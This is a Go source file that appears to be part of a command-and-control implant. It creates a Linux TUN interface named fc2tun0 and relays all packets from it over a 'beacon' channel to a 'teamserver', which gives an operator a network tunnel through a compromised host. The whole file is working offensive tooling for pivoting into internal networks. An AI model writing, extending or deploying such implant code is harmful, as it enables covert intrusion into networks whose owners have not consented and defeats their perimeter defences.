//go:build linux

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

const (
	iffTun  = 0x0001
	iffNoPi = 0x1000
	tunSetIff = 0x400454ca
)

type ifReq struct {
	Name  [16]byte
	Flags uint16
	pad   [22]byte
}

var tunFile *os.File

func startAgentTUN(cidr string) (string, error) {
	f, err := os.OpenFile("/dev/net/tun", os.O_RDWR, 0)
	if err != nil {
		return "", fmt.Errorf("open /dev/net/tun: %w (needs CAP_NET_ADMIN and the tun device)", err)
	}
	var req ifReq
	copy(req.Name[:], "fc2tun0")
	req.Flags = iffTun | iffNoPi
	_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetIff, uintptr(unsafe.Pointer(&req)))
	if errno != 0 {
		f.Close()
		return "", fmt.Errorf("TUNSETIFF: %v", errno)
	}
	name := strings.TrimRight(string(req.Name[:]), "\x00")
	ip := strings.Split(cidr, "/")[0]
	_ = exec.Command("ip", "link", "set", name, "up").Run()
	if cidr != "" {
		_ = exec.Command("ip", "addr", "add", cidr, "dev", name).Run()
	}
	tunFile = f
	go tunReadLoop(f)
	socksEnqueueOut(0, "tun_up", []byte(name+" "+cidr))
	return fmt.Sprintf("tun %s up addr=%s (packets framed over beacon as tun_data; pair with teamserver UDP helper)", name, ip), nil
}

func stopAgentTUN() error {
	if tunFile != nil {
		_ = tunFile.Close()
		tunFile = nil
	}
	socksEnqueueOut(0, "tun_down", nil)
	return nil
}

func tunReadLoop(f *os.File) {
	buf := make([]byte, 65535)
	for {
		n, err := f.Read(buf)
		if err != nil {
			return
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		tunEnqueue(pkt)
	}
}

func tunWritePacket(pkt []byte) {
	if tunFile == nil || len(pkt) == 0 {
		return
	}
	_, _ = tunFile.Write(pkt)
}
